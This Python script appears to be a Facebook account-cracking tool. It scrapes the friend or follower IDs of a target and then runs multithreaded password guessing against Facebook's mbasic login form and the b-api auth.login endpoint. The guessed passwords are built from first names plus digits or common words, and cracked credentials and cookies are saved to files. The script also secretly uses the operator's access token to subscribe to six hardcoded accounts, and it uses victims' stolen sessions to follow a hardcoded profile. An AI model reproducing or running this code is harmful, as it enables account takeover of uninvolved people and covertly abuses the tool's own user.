#!/usr/bin/python
#encoding=utf-8
import requests as req,json,time,os,sys,re
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
from random import choice as awokawok,randint as kontol

id=[]
ok,cp,cot=0,0,0
ajg=""
mb="https://mbasic.facebook.com"

def login():
	os.system("clear")
	print("""
	 LOGIN WITH ONLY TOKEN
	""")
	print("[1]. INPUT TOKEN\n[2]. HOW TO CREATE TOKEN\n")
	pil=input("[!] : Select Login Method")
	if(pil in ("01","1")):
		to=input("[+] Enter your Access Token: ")
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
		try:
			nama=r['name']
			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100004018035398/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={to}')
			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={to}")
			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
			print(f"[☆] LOGIN SUCCESSFULLY [☆]\nWelcome {nama}")
			open("save","a").write(to)
			time.sleep(1.5)
			crack(to,nama).menu()
		except KeyError:
			print("[×] TOKN EXPIRED [×]\nCREATE NEW TOKN ")
			time.sleep(1.5)
			login()
	elif(pil in ("2","02")):
		os.system("xdg-open https://youtu.be/guj9s2aK3vM")
	elif(pil in (" ","  ","   ","    ","     ")):
		print("[!] DONT EMPTY")
		time.sleep(1)
		login()
	else:
		print("[!] OPTION NONE")
		time.sleep(1)
		login()
def logika():
	try:
		token=open("save","r").read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
		nama=r['name']
		print(f"[☆] YOU ALRDY LOGIN [☆]\nWelcome Back {nama}")
		time.sleep(1.5)
		crack(token,nama).menu()
	except FileNotFoundError:
		print("[!]You are not logged in. Please login first  [!]")
		time.sleep(2)
		login()
	except KeyError:
		os.system("rm -rf save")
		exit("[!]Your token is invalid. Please login again")
		
class crack:
	
	def __init__(self,token,nama):
		self.token,self.nama=token,nama
	def jalan(self,text):
		for jalan in text+"\n":
			sys.stdout.write(jalan)
			sys.stdout.flush()
			time.sleep(0.02)
	def crack(self,user,lala,asu):
		global ok,cp,cot,ajg
		ua=awokawok(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
		print(f'\r[ CRACK ] {str(cot)}/{str(len(id))} | OK/CP:-{str(ok)}/{str(cp)} | {time.strftime("%X")}',end='')
		if ajg!=user:
			ajg=user
			cot+=1
		for pw in lala:
			pw=pw.replace('name',asu)
			data={}
			ses=req.Session()
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8",headers={"user-agent":ua}).text,"html.parser")
			b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for c in a("input"):
				try:
					if c.get("name") in b:data.update({c.get("name"):c.get("value")})
					else:continue
				except:pass
			data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
			if 'c_user' in d.cookies.get_dict().keys():
				ok+=1
				open('ok','a').write(user+' '+pw+'\n')
				print(f'\r\33[32;1m(√) NO CHECKPOINT (✓)\n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                         \n(√) COOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
				coki={"cookie":"".join(d.cookies.get_dict())}
				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
				for fllow in r.find_all("a"):
					if "Berhenti mengikuti" in str(fllow):
						break
					elif "Ikuti" in str(fllow):
						req.get(mb+fllow["href"],cookies=coki)
				break
			elif 'checkpoint' in d.cookies.get_dict().keys():
				cp+=1
				try:
					ttl=json.loads(req.get(f"https://graph.facebook.com/{user}?access_token={self.token}").text)['birthday']
				except KeyError:ttl='-'
				open('cp','a').write(user+' '+pw+' '+ttl+'\n')
				print(f'\r\33[1;33m(×) CHECKPOINT (×)                                   \n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                                   \n(×) TTL\t\t: {ttl}                                   \n-------------------------------------------\33[37;1m                                   ',end='')
				break
	def crack2(self,user,lala,asu):
		global ok,cp,cot,ajg
		ua=awokawok(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
		print(f'\r[ CRACK ] {str(cot)}/{str(len(id))} | OK/CP:-{str(ok)}/{str(cp)} | {time.strftime("%X")}',end='')
		if ajg!=user:
			ajg=user
			cot+=1
		for pw in lala:
			r = req.Session()
			headers = {"x-fb-connection-bandwidth": str(kontol(20000000.0, 30000000.0)), "x-fb-sim-hni": str(kontol(20000, 40000)), "x-fb-net-hni": str(kontol(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
			send = json.loads(r.get("https://b-api.facebook.com/method/auth.login", params=param, headers=headers).text)
			if "session_key" in send or "EAAA" in send:
				ok+=1
				open('ok','a').write(user+'|'+pw+'\n')
				print(f'\r\33[32;1m* --> [OK] {user}|{pw}|{send["access_token"]}\33[37;1m                     \n',end='')
				break
			elif "www.facebook.com" in send["error_msg"]:
				cp+=1
				open('cp','a').write(user+'|'+pw+'\n')
				print(f'\r\33[1;33m* --> [CP] {user}|{pw}\33[37;1m                      \n',end='')
				break
				
	def kirim(self):
		self.jalan(f"\n[=] Total  ID: {str(len(id))}")
		pil=input("[?] USE MANUAL PASSWORDS [Y/T]: ")
		if(pil in ("y","Y")):
			with Bool(max_workers=35) as kirim:
				print("[!] EXAMPL (223344,name,name123)")
				pwList=input("[+] Masukan Password List: ").split(",")
				print("\nchose Methode Crack\n[1]. Crack Methode B-api (FAST)\n[2]. Crack Methode Mbasic (NORMAL) [ RECOMENDED ]\n")
				tip=input("[?] Select: ")
				self.jalan(f'\n[√] Crack Running Hit: {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				if(tip in ("02","2")):
					for email in id:
						uid,name=email.split("|")
						kirim.submit(self.crack,uid,pwList,name.lower())
				elif(tip in ("01","1")):
					for email in id:
						uid,name=email.split("|")
						kirim.submit(self.crack2,uid,pwList,name.lower())
		elif(pil in ("t","T")):
			with Bool(max_workers=35) as kirim:
				print("\n[!]chose Methode Crack\n[1]. Crack Methode B-api (FAST)\n[2]. Crack Methode Mbasic (NORMAL) [ RECOMENDED ]\n")
				tip=input("[?] Select: ")
				self.jalan(f'\n[√] Crack Running Hit: {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','pakistan']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','pakistan']
					else:
						pw=[name.lower()+'12345','pakistan']
					if(tip in ("02","2")):
						kirim.submit(self.crack,uid,pw,name.lower())
					elif(tip in ("01","1")):
						kirim.submit(self.crack2,uid,pw,name.lower())
		else:
			with Bool(max_workers=35) as kirim:
				print("\n[!] chose Metode Crack\n[1]. Crack Metode B-api\n[2]. Crack Metode Mbasic [ RECOMENDED ]\n")
				tip=input("[?] Select: ")
				self.jalan(f'\n[√] Crack Running Hit: {time.strftime("%X")}')
				print(f'+'+'-'*45+'+\n')
				for email in id:
					uid,name=email.split("|")
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah']
					else:
						pw=[name.lower()+'12345','bismillah']
					if(tip in ("02","2")):
						kirim.submit(self.crack,uid,pw,name.lower())
					elif(tip in ("01","1")):
						kirim.submit(self.crack2,uid,pw,name.lower())
	def useragent(self):
		ua=open("ua","r").read()
		print("\n### Current Useragent:",ua)
		print("\n Change Useragent?")
		yt=input("[?] Answer [Y/T]: ")
		if(yt in ("y","Y")):
			os.system("rm -rf ua")
			uaBaru=input("[+] Enter New Useragent: ")
			open("ua","w").write(uaBaru)
			input("\n[✓] Useragent change successful;\n[!] Press Enter For Back To Menu")
			self.menu()
		elif(yt in ("t","T")):
			self.menu()
	def menu(self):
		wok=[]
		os.system('clear')
		ha=0
		print("""
  
                                                                                                         
                                                                                                         
        GGGGGGGGGGGGGHHHHHHHHH     HHHHHHHHH     OOOOOOOOO        SSSSSSSSSSSSSSS TTTTTTTTTTTTTTTTTTTTTTT
     GGG::::::::::::GH:::::::H     H:::::::H   OO:::::::::OO    SS:::::::::::::::ST:::::::::::::::::::::T
   GG:::::::::::::::GH:::::::H     H:::::::H OO:::::::::::::OO S:::::SSSSSS::::::ST:::::::::::::::::::::T
  G:::::GGGGGGGG::::GHH::::::H     H::::::HHO:::::::OOO:::::::OS:::::S     SSSSSSST:::::TT:::::::TT:::::T
 G:::::G       GGGGGG  H:::::H     H:::::H  O::::::O   O::::::OS:::::S            TTTTTT  T:::::T  TTTTTT
G:::::G                H:::::H     H:::::H  O:::::O     O:::::OS:::::S                    T:::::T        
G:::::G                H::::::HHHHH::::::H  O:::::O     O:::::O S::::SSSS                 T:::::T        
G:::::G    GGGGGGGGGG  H:::::::::::::::::H  O:::::O     O:::::O  SS::::::SSSSS            T:::::T        
G:::::G    G::::::::G  H:::::::::::::::::H  O:::::O     O:::::O    SSS::::::::SS          T:::::T        
G:::::G    GGGGG::::G  H::::::HHHHH::::::H  O:::::O     O:::::O       SSSSSS::::S         T:::::T        
G:::::G        G::::G  H:::::H     H:::::H  O:::::O     O:::::O            S:::::S        T:::::T        
 G:::::G       G::::G  H:::::H     H:::::H  O::::::O   O::::::O            S:::::S        T:::::T        
  G:::::GGGGGGGG::::GHH::::::H     H::::::HHO:::::::OOO:::::::OSSSSSSS     S:::::S      TT:::::::TT      
   GG:::::::::::::::GH:::::::H     H:::::::H OO:::::::::::::OO S::::::SSSSSS:::::S      T:::::::::T      
     GGG::::::GGG:::GH:::::::H     H:::::::H   OO:::::::::OO   S:::::::::::::::SS       T:::::::::T      
        GGGGGG   GGGGHHHHHHHHH     HHHHHHHHH     OOOOOOOOO      SSSSSSSSSSSSSSS         TTTTTTTTTTT      
                                                                                                         
                                                                                                         
                                                                                                         
                                                                    
        Latif. H & Yanwar. E
        """)
		self.jalan(f"[!] Welcome {self.nama} [ FREE MODE ]\n")
		print('[1]. Crack From Friends/Publik (MULTI)\n[2]. Crack From Followers (MULTI)\n[C]. Check crack results\n[S]. Setting Useragent\n[L]. Logout Script\n[R]. Report Bugs or Errors')
		print(f'+'+'-'*45+'+\n')
		pil=input('[+] Select: ')
		if(pil in ('01','1')):
			print('\n\t CRACK FRIENDS LIST')
			try:
				jumlah=int(input("\n[!] kitni idz sy clone krna hn\n[?] input amount limit 10: "))
				if(jumlah>=11):
					print("\n[!] INPUT PUBLK FRND IDZ LIMIT 10")
					time.sleep(2)
					self.menu()
				else:pass
			except:jumlah=1
			print("\nType 'me' Crack Your Account Friends List")
			for j in range(jumlah):
				ha+=1
				target=input(f"[+] Enter Target ID To {ha}: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					print(f"[=] Name Target\t: {rr['name']}")
					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
					for x in ro['data']:
						wok.append(x['id'])
					print(f"[=] Amount ID\t: {len(wok)}")
					wok.clear()
				except KeyError:
					print("No Target")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ('02','2')):
			print('\n\t')
			try:
				jumlah=int(input("\n[!] kitni idz sy clone krna hn\n[?] input amount limit 10: "))
				if(jumlah>=11):
					print("\n[!] INPUT PBLK FOLWRS IDZ LIMIT 10")
					time.sleep(2)
					self.menu()
				else:pass
			except:jumlah=1
			print("\nType 'me' Crack Your Account Friends List")
			for j in range(jumlah):
				target=input("[+] Enter Target ID To: ").replace("'me'","me")
				try:
					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
					print(f"[=] Name Target\t: {rr['name']}")
					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
					for x in ro['data']:
						wok.append(x['id'])
					print(f"[=] Amount ID\t: {len(wok)}")
					wok.clear()
				except KeyError:
					print("NO TARGET")
					time.sleep(1)
					self.menu()
				r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
				for x in r['data']:
					idnya=x['id']
					nama=x['name'].rsplit(' ')[0]
					id.append(idnya+'|'+nama)
			self.kirim()
		elif(pil in ("c","C")):
			print("\n\n Check ok \n[1]. Check Ok\n[2]. Check Cp\n[3]. Exit Menu\n")
			hh=input("[!] Select: ")
			if(hh in ("01","1")):
				try:
					print("\n"+open("ok","r").read())
					input("Enter For Back To Menu")
					self.menu()
				except FileNotFoundError:
					input("\n[!] You Haven't Get Ok Results\nEnter For Back To Menu")
					self.menu()
			elif(hh in ("02","2")):
				try:
					print("\n"+open("cp","r").read())
					input("Enter For Back To Menu")
					self.menu()
				except FileNotFoundError:
					input("\n[!] You Haven't Get cp Results\nEnter For Back To Menu")
					self.menu()
			elif(hh in ("03","3")):
				self.menu()
		elif(pil in ("s","S")):
			self.useragent()
		elif(pil in ('l','L')):
			os.system('rm -rf save')
			exit('\nSuccessfully Logout And Delete Account')
		elif(pil in ("r","R")):
			print("\n[√] Go to FACEBOOK Author....\n[!] Klik Buka Dengan WhatsApp")
			os.system("xdg-open https://m.facebook.com/HATERZKAABUUGZAINI2")

if __name__=="__main__":
	try:
		ua=open("ua","r").read()
	except FileNotFoundError:
		print("[!] Useragent Not Available")
		tll=input("[+] Please Enter Useragent: ")
		open("ua","a").write(tll)
		print("[√] Added Successfully\nOn the way to Tool")
		time.sleep(1)
	logika()
